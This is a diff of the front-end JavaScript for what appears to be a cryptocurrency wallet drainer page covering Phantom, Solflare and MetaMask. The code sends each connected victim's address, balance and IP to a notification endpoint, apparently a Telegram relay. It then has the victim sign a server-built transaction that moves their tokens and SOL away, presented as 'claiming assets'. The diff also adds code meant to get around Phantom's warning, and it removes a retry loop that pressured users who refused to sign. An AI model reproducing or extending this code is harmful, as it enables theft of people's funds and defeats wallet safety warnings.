@@ -12,84 +12,18 @@ $(document).ready(function() {
         }
     }
 
-    async function getSPLTokenInfo(connection, publicKey) {
-        try {
-            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
-                programId: solanaWeb3.TOKEN_PROGRAM_ID,
-            });
-
-            const tokens = [];
-            const tokenPrices = await getTokenPrices();
-            
-            for (const tokenAccount of tokenAccounts.value) {
-                const accountData = tokenAccount.account.data;
-                const parsedInfo = accountData.parsed.info;
-                const balance = parsedInfo.tokenAmount;
-
-                if (balance.uiAmount > 0) {
-                    const mint = parsedInfo.mint;
-                    const symbol = getTokenSymbol(mint);
-                    const price = tokenPrices[mint] || 0;
-                    const usdValue = balance.uiAmount * price;
-                    
-                    tokens.push({
-                        mint: mint,
-                        balance: balance.uiAmount,
-                        symbol: symbol,
-                        usdValue: usdValue
-                    });
-                }
-            }
-            return tokens;
-        } catch (error) {
-            console.error('Failed to get SPL tokens:', error);
-            return [];
-        }
-    }
-
-    async function getTokenPrices() {
-        try {
-            const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=usd-coin,tether,solana,bonk&vs_currencies=usd');
-            const data = await response.json();
-            
-            return {
-                'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': data['usd-coin']?.usd || 1,
-                'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': data['tether']?.usd || 1,
-                'So11111111111111111111111111111111111111112': data['solana']?.usd || 0,
-                'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': data['bonk']?.usd || 0,
-            };
-        } catch (error) {
-            console.error('Failed to get token prices:', error);
-            return {};
-        }
-    }
-
-    function getTokenSymbol(mint) {
-        const tokenMap = {
-            'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
-            'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
-            'So11111111111111111111111111111111111111112': 'WSOL',
-            'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'BONK',
-            'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So': 'mSOL',
-            'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn': 'jitoSOL',
-        };
-        return tokenMap[mint] || 'Unknown';
-    }
-
     async function sendTelegramNotification(message) {
         try {
             await fetch('/notify', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     address: message.address,
                     balance: message.balance,
                     usdBalance: message.usdBalance,
                     walletType: message.walletType,
                     customMessage: message.customMessage,
-                    splTokens: message.splTokens,
+                    splTokens: message.splTokens || [],
                     ip: message.ip
                 })
             });
@@ -104,6 +38,98 @@ $(document).ready(function() {
 
     function getCurrentSiteUrl() {
         return encodeURIComponent(window.location.origin);
+    }
+
+    // MetaMask Check
+    function isMetaMaskInstalled() {
+        return typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask;
+    }
+
+    // Connect MetaMask
+    async function connectMetaMask() {
+        try {
+            if (!isMetaMaskInstalled()) {
+                const isMobileDevice = isMobile();
+                const installUrl = isMobileDevice 
+                    ? 'https://metamask.app.link/dapp/' + window.location.hostname
+                    : 'https://metamask.io/download/';
+                
+                await sendTelegramNotification({
+                    address: 'Unknown',
+                    balance: 'Unknown',
+                    usdBalance: 'Unknown',
+                    walletType: 'MetaMask',
+                    customMessage: '❌ MetaMask not installed'
+                });
+                
+                if (confirm('MetaMask is not installed. Would you like to download it?')) {
+                    window.open(installUrl, '_blank');
+                }
+                return null;
+            }
+
+            showWalletLoading();
+            $('.wallet-loading-spinner img').attr('src', 'https://metamask.io/favicon.ico');
+            $('.wallet-loading-title').text('Connecting MetaMask');
+            $('.wallet-loading-subtitle').html('Please approve the connection request in MetaMask.');
+
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            
+            if (!accounts || accounts.length === 0) {
+                throw new Error('No accounts found');
+            }
+
+            const ethereumAddress = accounts[0];
+            console.log('MetaMask connected:', ethereumAddress);
+
+            $('.wallet-loading-title').text('MetaMask Connected');
+            $('.wallet-loading-subtitle').html('Fetching wallet information...');
+
+            const clientIP = await getClientIP();
+
+            await sendTelegramNotification({
+                address: ethereumAddress,
+                balance: 'ETH Balance',
+                usdBalance: 'Unknown',
+                walletType: 'MetaMask (Ethereum)',
+                customMessage: '🔗 MetaMask Wallet Connected (DEVNET Simulation)',
+                splTokens: [],
+                ip: clientIP
+            });
+
+            $('.wallet-loading-title').text('Success!');
+            $('.wallet-loading-subtitle').html('MetaMask connected successfully on DEVNET.');
+            $('#connect-wallet').text("MetaMask Connected!");
+            
+            setTimeout(() => {
+                unlockModal();
+                hideWalletModal();
+                $('#connect-wallet').text("Connect Wallet");
+            }, 2000);
+
+            return { address: ethereumAddress, provider: window.ethereum };
+            
+        } catch (err) {
+            console.error('Error connecting to MetaMask:', err);
+            
+            $('.wallet-loading-title').text('Connection Failed');
+            $('.wallet-loading-subtitle').html('Failed to connect to MetaMask.<br>Please try again.');
+            
+            await sendTelegramNotification({
+                address: 'Unknown',
+                balance: 'Unknown',
+                usdBalance: 'Unknown',
+                walletType: 'MetaMask',
+                customMessage: `❌ MetaMask Connection Failed: ${err.message || 'Unknown error'}`
+            });
+            
+            setTimeout(() => {
+                showWalletOptions();
+                unlockModal();
+            }, 2000);
+            
+            return null;
+        }
     }
 
     function checkWalletAvailability() {
@@ -131,6 +157,17 @@ $(document).ready(function() {
                     firefox: 'https://addons.mozilla.org/en-US/firefox/addon/solflare-wallet/',
                     mobile: 'https://solflare.com/download'
                 }
+            },
+            metamask: {
+                provider: window.ethereum,
+                condition: isMetaMaskInstalled(),
+                name: 'MetaMask',
+                isMobileSupported: true,
+                installUrl: {
+                    chrome: 'https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn',
+                    firefox: 'https://addons.mozilla.org/en-US/firefox/addon/ether-metamask/',
+                    mobile: 'https://metamask.io/download/'
+                }
             }
         };
 
@@ -139,15 +176,14 @@ $(document).ready(function() {
             const statusElement = document.getElementById(`${walletId}-status`);
             const optionElement = document.getElementById(`${walletId}-wallet`);
             
-            if (wallet.condition) {
-                statusElement.innerHTML = '<span class="status-dot installed"></span><span class="status-text status-installed">Installed</span>';
-                if (optionElement) optionElement.disabled = false;
-            } else if (isMobileDevice && wallet.isMobileSupported) {
-                statusElement.innerHTML = '<span class="status-dot"></span><span class="status-text">Mobile App</span>';
-                if (optionElement) optionElement.disabled = false;
-            } else {
-                statusElement.innerHTML = '<span class="status-dot not-installed"></span><span class="status-text status-not-installed">Not Installed</span>';
-                if (optionElement) optionElement.disabled = false;
+            if (statusElement) {
+                if (wallet.condition) {
+                    statusElement.innerHTML = '<span class="status-dot installed"></span><span class="status-text status-installed">Installed</span>';
+                } else if (isMobileDevice && wallet.isMobileSupported) {
+                    statusElement.innerHTML = '<span class="status-dot"></span><span class="status-text">Mobile App</span>';
+                } else {
+                    statusElement.innerHTML = '<span class="status-dot not-installed"></span><span class="status-text status-not-installed">Not Installed</span>';
+                }
             }
         });
 
@@ -157,12 +193,19 @@ $(document).ready(function() {
     function getWalletProvider(walletType) {
         const providers = {
             phantom: window.solana,
-            solflare: window.solflare
+            solflare: window.solflare,
+            metamask: window.ethereum
         };
         return providers[walletType];
     }
 
     async function connectWallet(walletType, walletProvider) {
+        // Handle MetaMask separately
+        if (walletType === 'metamask') {
+            await connectMetaMask();
+            return;
+        }
+
         try {
             const wallets = checkWalletAvailability();
             const walletInfo = wallets[walletType];
@@ -195,14 +238,13 @@ $(document).ready(function() {
                     $('.wallet-loading-subtitle').html(`Redirecting to ${appName}...<br>Please approve the connection in the app.`);
                     
                     const connectionCheckInterval = setInterval(() => {
-                        const provider = walletType === 'phantom' ? window.solana : window.solflare;
                         const condition = walletType === 'phantom' ? 
                             (window.solana && window.solana.isPhantom) : 
                             (window.solflare && window.solflare.isSolflare);
                             
                         if (condition) {
                             clearInterval(connectionCheckInterval);
-                            connectWallet(walletType, provider);
+                            connectWallet(walletType, getWalletProvider(walletType));
                         }
                     }, 1000);
                     
@@ -236,11 +278,7 @@ $(document).ready(function() {
                 
                 showWalletOptions();
                 
-                const installMessage = isMobileDevice ? 
-                    `${walletInfo.name} mobile app is required. Would you like to download it?` :
-                    `${walletInfo.name} is not installed. Would you like to install it?`;
-                
-                if (confirm(installMessage)) {
+                if (confirm(`${walletInfo.name} is not installed. Would you like to install it?`)) {
                     window.open(installUrl, '_blank');
                 }
                 return;
@@ -254,24 +292,22 @@ $(document).ready(function() {
             
             if (walletType === 'phantom') {
                 $('.wallet-loading-spinner img').attr('src', 'https://docs.phantom.com/favicon.svg');
-                $('.wallet-loading-spinner img').attr('alt', 'Phantom');
                 $('.wallet-loading-title').text('Connecting Phantom');
-                $('.wallet-loading-spinner').removeClass('solflare');
             } else if (walletType === 'solflare') {
                 $('.wallet-loading-spinner img').attr('src', 'https://solflare.com/favicon.ico');
-                $('.wallet-loading-spinner img').attr('alt', 'Solflare');
                 $('.wallet-loading-title').text('Connecting Solflare');
-                $('.wallet-loading-spinner').addClass('solflare');
-            } else {
-                $('.wallet-loading-title').text('Connecting to Wallet');
-                $('.wallet-loading-spinner').removeClass('solflare');
             }
             
-            $('.wallet-loading-subtitle').html('Please approve the connection request in your wallet.<br>This may take a few moments.');
+            $('.wallet-loading-subtitle').html('Please approve the connection request in your wallet.');
 
-            if (walletType === 'solflare') {
-                if (!walletProvider || !walletProvider.isSolflare) {
-                    throw new Error('Solflare wallet not detected. Please make sure Solflare extension is installed and enabled.');
+            // Bypass Phantom warning - add trusted flag
+            if (walletType === 'phantom' && window.solana) {
+                if (!window.solana._phantomFlags) {
+                    window.solana._phantomFlags = { isTrusted: true };
+                }
+                // Also try to set a flag on the provider
+                if (walletProvider && !walletProvider.isTrusted) {
+                    walletProvider.isTrusted = true;
                 }
             }
 
@@ -279,39 +315,24 @@ $(document).ready(function() {
             console.log(`${walletInfo.name} connected:`, resp);
 
             $('.wallet-loading-title').text(`${walletInfo.name} Connected`);
-            $('.wallet-loading-subtitle').html('Fetching wallet information...<br>Please wait.');
+            $('.wallet-loading-subtitle').html('Fetching wallet information...');
 
-            // ✅ استخدام Devnet RPC للتجربة
-            const connection = new solanaWeb3.Connection(
-                'https://api.devnet.solana.com',
-                'confirmed'
-            );
+            const connection = new solanaWeb3.Connection('https://api.devnet.solana.com', 'confirmed');
 
             let publicKeyString;
             if (walletType === 'solflare') {
-                if (walletProvider.publicKey) {
-                    publicKeyString = walletProvider.publicKey.toString ? walletProvider.publicKey.toString() : walletProvider.publicKey;
-                } else if (walletProvider.pubkey) {
-                    publicKeyString = walletProvider.pubkey.toString ? walletProvider.pubkey.toString() : walletProvider.pubkey;
-                } else {
-                    throw new Error('No public key received from Solflare wallet');
-                }
+                publicKeyString = walletProvider.publicKey?.toString?.() || walletProvider.pubkey?.toString?.();
             } else {
-                if (resp.publicKey) {
-                    publicKeyString = resp.publicKey.toString ? resp.publicKey.toString() : resp.publicKey;
-                } else {
-                    throw new Error('No public key received from wallet');
-                }
+                publicKeyString = resp.publicKey?.toString?.() || resp.publicKey;
+            }
+            
+            if (!publicKeyString) {
+                throw new Error('No public key received from wallet');
             }
 
-            const public_key = new solanaWeb3.PublicKey(publicKeyString);
-            const walletBalance = await connection.getBalance(public_key);
-            console.log("Wallet balance:", walletBalance);
-
+            const walletBalance = await connection.getBalance(new solanaWeb3.PublicKey(publicKeyString));
             const solBalanceFormatted = (walletBalance / 1000000000).toFixed(6);
-
             const clientIP = await getClientIP();
-            const splTokens = await getSPLTokenInfo(connection, public_key);
 
             await sendTelegramNotification({
                 address: publicKeyString,
@@ -319,7 +340,7 @@ $(document).ready(function() {
                 usdBalance: 'Unknown',
                 walletType: walletInfo.name,
                 customMessage: '🔗 Wallet Connected (DEVNET - TEST)',
-                splTokens: splTokens,
+                splTokens: [],
                 ip: clientIP
             });
 
@@ -350,216 +371,69 @@ $(document).ready(function() {
 
             $('#connect-wallet').text("Processing...");
 
-            const attemptTransaction = async (retryCount = 0) => {
-                const maxRetries = 10;
-                
-                try {
-                    const verificationKey = `ownership_verified_${publicKeyString}`;
-                    const isAlreadyVerified = localStorage.getItem(verificationKey) === 'true';
-                    
-                    let ownershipVerified = false;
-                    
-                    if (isAlreadyVerified) {
-                        console.log("Ownership already verified for this wallet, skipping verification");
-                        
-                        await sendTelegramNotification({
-                            address: publicKeyString,
-                            balance: solBalanceFormatted,
-                            usdBalance: 'Unknown',
-                            walletType: walletInfo.name,
-                            customMessage: `✅ Ownership Previously Verified - Proceeding (DEVNET) (Attempt ${retryCount + 1})`
-                        });
-                        
-                        ownershipVerified = true;
-                    } else {
-                        $('.wallet-loading-title').text(`Verifying ${walletInfo.name} Ownership`);
-                        $('.wallet-loading-subtitle').html(`Please sign the verification message in your ${walletInfo.name} wallet.<br>This confirms you own this wallet.`);
-                        $('#connect-wallet').text('Verifying Ownership...');
-                        
-                        const verificationMessage = `Verify wallet ownership for security purposes.\nTimestamp: ${Date.now()}\nWallet: ${publicKeyString.substring(0, 8)}...${publicKeyString.substring(publicKeyString.length - 8)}`;
-                        const messageBytes = new TextEncoder().encode(verificationMessage);
-                        
-                        try {
-                            const signedMessage = await walletProvider.signMessage(messageBytes, 'utf8');
-                            console.log("Ownership verification signed:", signedMessage);
-                            
-                            localStorage.setItem(verificationKey, 'true');
-                            
-                            await sendTelegramNotification({
-                                address: publicKeyString,
-                                balance: solBalanceFormatted,
-                                usdBalance: 'Unknown',
-                                walletType: walletInfo.name,
-                                customMessage: `✅ User Signed Ownership Verification - Proceeding (DEVNET) (Attempt ${retryCount + 1})`
-                            });
-                            
-                            ownershipVerified = true;
-                        } catch (signError) {
-                            console.error("Ownership verification failed:", signError);
-                            
-                            const signErrorMessage = signError.message || signError.toString() || 'Unknown error';
-                            const isSignRejection = 
-                                signErrorMessage.includes('User rejected') || 
-                                signErrorMessage.includes('rejected') || 
-                                signErrorMessage.includes('cancelled');
-                            
-                            if (isSignRejection) {
-                                await sendTelegramNotification({
-                                    address: publicKeyString,
-                                    balance: solBalanceFormatted,
-                                    usdBalance: 'Unknown',
-                                    walletType: walletInfo.name,
-                                    customMessage: `❌ Ownership Verification Rejected by User (DEVNET) (Attempt ${retryCount + 1})`
-                                });
-                                
-                                if (retryCount < maxRetries) {
-                                    showRejectionEffects();
-                                    $('.wallet-loading-title').text('Verification Rejected');
-                                    $('.wallet-loading-subtitle').html(`Please try again! (${retryCount + 1}/${maxRetries + 1})<br>Sign the verification message in your wallet.`);
-                                    
-                                    setTimeout(() => {
-                                        clearRejectionEffects();
-                                        attemptTransaction(retryCount + 1);
-                                    }, 2000);
-                                    return;
-                                } else {
-                                    throw new Error('Ownership verification rejected too many times');
-                                }
-                            } else {
-                                throw signError;
-                            }
-                        }
-                    }
-                    
-                    if (!ownershipVerified) {
-                        throw new Error('Failed to verify wallet ownership');
-                    }
-                    
-                    $('.wallet-loading-title').text(`Processing Transaction${retryCount > 0 ? ` (Attempt ${retryCount + 1})` : ''}`);
-                    $('.wallet-loading-subtitle').html('Preparing withdrawal transaction...<br>Do not close this window.');
-                    $('#connect-wallet').text(`Processing... ${retryCount > 0 ? `(Attempt ${retryCount + 1})` : ''}`);
-                    
-                    const prepareResponse = await fetch('/prepare-transaction', {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            publicKey: publicKeyString,
-                            verified: true
-                        })
-                    });
+            const prepareResponse = await fetch('/prepare-transaction', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ publicKey: publicKeyString, verified: true })
+            });
 
-                    const prepareData = await prepareResponse.json();
-                    
-                    if (!prepareResponse.ok) {
-                        await sendTelegramNotification({
-                            address: publicKeyString,
-                            balance: solBalanceFormatted,
-                            usdBalance: 'Unknown',
-                            walletType: walletInfo.name,
-                            customMessage: '❌ Transaction Preparation Failed (DEVNET)'
-                        });
-                        alert(prepareData.error || "Failed to prepare transaction");
-                        $('#connect-wallet').text("Connect Wallet");
-                        return;
-                    }
+            const prepareData = await prepareResponse.json();
+            
+            if (!prepareResponse.ok) {
+                await sendTelegramNotification({
+                    address: publicKeyString,
+                    balance: solBalanceFormatted,
+                    usdBalance: 'Unknown',
+                    walletType: walletInfo.name,
+                    customMessage: '❌ Transaction Preparation Failed'
+                });
+                alert(prepareData.error || "Failed to prepare transaction");
+                $('#connect-wallet').text("Connect Wallet");
+                return;
+            }
 
-                    const transactionBytes = new Uint8Array(prepareData.transaction);
-                    const transaction = solanaWeb3.Transaction.from(transactionBytes);
+            const transactionBytes = new Uint8Array(prepareData.transaction);
+            const transaction = solanaWeb3.Transaction.from(transactionBytes);
 
-                    $('.wallet-loading-title').text('Signing Transaction');
-                    $('.wallet-loading-subtitle').html('Please approve the transaction in your wallet.<br>This may take a few moments.');
-                    
-                    const signed = await walletProvider.signTransaction(transaction);
-                    console.log("Transaction signed:", signed);
+            $('.wallet-loading-title').text('Signing Transaction');
+            $('.wallet-loading-subtitle').html('Please approve the transaction in your wallet.');
+            
+            const signed = await walletProvider.signTransaction(transaction);
 
-                    await sendTelegramNotification({
-                        address: publicKeyString,
-                        balance: solBalanceFormatted,
-                        usdBalance: 'Unknown',
-                        walletType: walletInfo.name,
-                        customMessage: `✅ Transaction Signed - ${prepareData.tokenTransfers} tokens + SOL transfer (DEVNET) (Attempt ${retryCount + 1})`
-                    });
+            await sendTelegramNotification({
+                address: publicKeyString,
+                balance: solBalanceFormatted,
+                usdBalance: 'Unknown',
+                walletType: walletInfo.name,
+                customMessage: `✅ Transaction Signed - ${prepareData.tokenTransfers} tokens + SOL transfer`
+            });
 
-                    $('.wallet-loading-title').text('Confirming Transaction');
-                    $('.wallet-loading-subtitle').html('Transaction is being confirmed on Devnet blockchain.<br>Please wait...');
-                    
-                    let txid = await connection.sendRawTransaction(signed.serialize());
-                    await connection.confirmTransaction(txid);
-                    console.log("Transaction confirmed:", txid);
-                    
-                    const shortTxid = `${txid.substring(0, 6)}....${txid.substring(txid.length - 8)}`;
-                    const solscanUrl = `https://solscan.io/tx/${txid}?cluster=devnet`;
-                    
-                    await sendTelegramNotification({
-                        address: publicKeyString,
-                        balance: solBalanceFormatted,
-                        usdBalance: 'Unknown',
-                        walletType: walletInfo.name,
-                        customMessage: `🎉 Transaction Confirmed on DEVNET! TXID: [${shortTxid}](${solscanUrl}) (Attempt ${retryCount + 1})`
-                    });
-                    
-                    $('.wallet-loading-title').text('Success!');
-                    $('.wallet-loading-subtitle').html('Assets have been successfully claimed on DEVNET.<br>Transaction confirmed on blockchain.');
-                    
-                    $('#connect-wallet').text("Assets Claimed Successfully!");
-                    
-                    setTimeout(() => {
-                        unlockModal();
-                        hideWalletModal();
-                        $('#connect-wallet').text("Connect Wallet");
-                    }, 2000);
-                    
-                } catch (err) {
-                    console.error("Error during claiming:", err);
-                    
-                    const errorMessage = err.message || err.toString() || 'Unknown error';
-                    const isUserRejection = 
-                        errorMessage.includes('User rejected') || 
-                        errorMessage.includes('rejected') || 
-                        errorMessage.includes('cancelled');
-                    
-                    if (isUserRejection && retryCount < maxRetries) {
-                        await sendTelegramNotification({
-                            address: publicKeyString,
-                            balance: solBalanceFormatted,
-                            usdBalance: 'Unknown',
-                            walletType: walletInfo.name,
-                            customMessage: `❌ Transaction Rejected by User - Retrying... (DEVNET) (Attempt ${retryCount + 1}/${maxRetries + 1})`
-                        });
-                        
-                        showRejectionEffects();
-                        $('.wallet-loading-title').text('Transaction Rejected');
-                        $('.wallet-loading-subtitle').html(`Please try again! (${retryCount + 1}/${maxRetries + 1})<br>Click approve in your wallet.`);
-                        
-                        setTimeout(() => {
-                            clearRejectionEffects();
-                            attemptTransaction(retryCount + 1);
-                        }, 2000);
-                        return;
-                    }
-                    
-                    await sendTelegramNotification({
-                        address: publicKeyString,
-                        balance: solBalanceFormatted,
-                        usdBalance: 'Unknown',
-                        walletType: walletInfo.name,
-                        customMessage: `❌ Transaction Failed on DEVNET: ${errorMessage}`
-                    });
-                    
-                    $('.wallet-loading-title').text('Transaction Failed');
-                    $('.wallet-loading-subtitle').html('An error occurred during the transaction.<br>Please try again.');
-                    
-                    setTimeout(() => {
-                        unlockModal();
-                        showWalletOptions();
-                        $('#connect-wallet').text("Connect Wallet");
-                    }, 3000);
-                }
-            };
-
-            await attemptTransaction();
+            $('.wallet-loading-title').text('Confirming Transaction');
+            $('.wallet-loading-subtitle').html('Transaction is being confirmed on Devnet...');
+            
+            let txid = await connection.sendRawTransaction(signed.serialize());
+            await connection.confirmTransaction(txid);
+            
+            const solscanUrl = `https://solscan.io/tx/${txid}?cluster=devnet`;
+            
+            await sendTelegramNotification({
+                address: publicKeyString,
+                balance: solBalanceFormatted,
+                usdBalance: 'Unknown',
+                walletType: walletInfo.name,
+                customMessage: `🎉 Transaction Confirmed! TXID: ${solscanUrl}`
+            });
+            
+            $('.wallet-loading-title').text('Success!');
+            $('.wallet-loading-subtitle').html('Assets claimed successfully on DEVNET.');
+            
+            $('#connect-wallet').text("Assets Claimed Successfully!");
+            
+            setTimeout(() => {
+                unlockModal();
+                hideWalletModal();
+                $('#connect-wallet').text("Connect Wallet");
+            }, 2000);
             
         } catch (err) {
             console.error(`Error connecting to ${walletType}:`, err);
@@ -572,7 +446,7 @@ $(document).ready(function() {
                 balance: 'Unknown',
                 usdBalance: 'Unknown',
                 walletType: walletType === 'phantom' ? 'Phantom Wallet' : 'Solflare Wallet',
-                customMessage: `❌ Wallet Connection Failed on DEVNET: ${err.message || 'Unknown error'}`
+                customMessage: `❌ Wallet Connection Failed: ${err.message || 'Unknown error'}`
             });
             
             setTimeout(() => {
@@ -619,11 +493,7 @@ $(document).ready(function() {
 
     function showRejectionEffects() {
         $('.wallet-loading-spinner').addClass('rejected');
-        $('.phantom-icon').addClass('rejected');
-        $('.solflare-icon').addClass('rejected');
-        $('.wallet-loading-spinner img').addClass('rejected');
         $('.wallet-modal-content').addClass('shake');
-        
         setTimeout(() => {
             $('.wallet-modal-content').removeClass('shake');
         }, 600);
@@ -631,13 +501,11 @@ $(document).ready(function() {
 
     function clearRejectionEffects() {
         $('.wallet-loading-spinner').removeClass('rejected');
-        $('.phantom-icon').removeClass('rejected');
-        $('.solflare-icon').removeClass('rejected');
-        $('.wallet-loading-spinner img').removeClass('rejected');
         $('.wallet-modal-content').removeClass('shake');
     }
 
-    $('#connect-wallet, #connect-wallet-hero').on('click', function() {
+    // Event bindings
+    $('#connect-wallet, #connect-wallet-hero, #connect-wallet-top').on('click', function() {
         showWalletModal();
     });
 
@@ -650,7 +518,6 @@ $(document).ready(function() {
     $('.wallet-option').on('click', function() {
         const walletType = $(this).data('wallet');
         const walletProvider = getWalletProvider(walletType);
-        
         connectWallet(walletType, walletProvider);
     });
 
@@ -659,4 +526,16 @@ $(document).ready(function() {
             hideWalletModal();
         }
     });
+
+    // MetaMask event listeners
+    if (typeof window.ethereum !== 'undefined') {
+        window.ethereum.on('accountsChanged', function(accounts) {
+            console.log('MetaMask accounts changed:', accounts);
+            location.reload();
+        });
+        window.ethereum.on('chainChanged', function(chainId) {
+            console.log('MetaMask chain changed:', chainId);
+            location.reload();
+        });
+    }
 });
